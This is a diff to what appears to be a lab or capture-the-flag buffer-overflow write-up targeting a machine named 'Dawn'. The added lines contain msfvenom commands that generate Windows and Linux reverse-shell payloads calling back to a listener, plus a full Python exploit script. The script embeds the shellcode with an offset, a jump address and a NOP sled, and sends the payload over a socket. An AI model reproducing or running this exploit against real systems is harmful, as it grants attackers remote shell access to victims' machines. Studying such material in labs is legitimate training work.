@@ -508,6 +508,7 @@ We are checking that every hex value from x00-FF is in order without any errors.
 
 # Generating the reverse shell
 We use msfvenom.  Our test target is windows and it is an x86 binary:
+msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
 
 ```python
 
@@ -586,3 +587,52 @@ if __name__ == "__main__":
 ## with our poc script working in our test environment, it's time to exploit our real target, the Dawn machine:
 change the server to the target IP
 generate shellcode to match the arch and OS of the target, namely linux and x86:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.55.12 LPORT=4444 -f py -b "\x00" -v shellcode
+
+```python
+
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "192.168.55.12"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+
+shellcode =  b""
+shellcode += b"\xb8\x0f\xe6\x73\xc6\xda\xc4\xd9\x74\x24\xf4"
+shellcode += b"\x5f\x2b\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e"
+shellcode += b"\x03\x48\xe8\x91\x33\x67\x2f\xa2\x5f\xd4\x8c"
+shellcode += b"\x1e\xca\xd8\x9b\x40\xba\xba\x56\x02\x28\x1b"
+shellcode += b"\xd9\x3c\x82\x1b\x50\x3a\xe5\x73\xa3\x14\x24"
+shellcode += b"\xb4\x4b\x67\x47\xab\xd7\xee\xa6\x7b\x81\xa0"
+shellcode += b"\x79\x28\xfd\x42\xf3\x2f\xcc\xc5\x51\xc7\xa1"
+shellcode += b"\xea\x26\x7f\x56\xda\xe7\x1d\xcf\xad\x1b\xb3"
+shellcode += b"\x5c\x27\x3a\x83\x68\xfa\x3d"
+
+
+As = b'A'
+Bs = b'B' * 4
+
+offset = 272
+nullbyte = b'\x00'
+nops = b'\x90' * 16
+jmp_addr = b'\xba\x64\x59\x34'
+payload = As * offset + jmp_addr+ nops + shellcode + nops + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+```
+
+![bling](https://user-images.githubusercontent.com/76034874/181871630-b621286e-9424-49de-b801-12e18335066f.png)
+
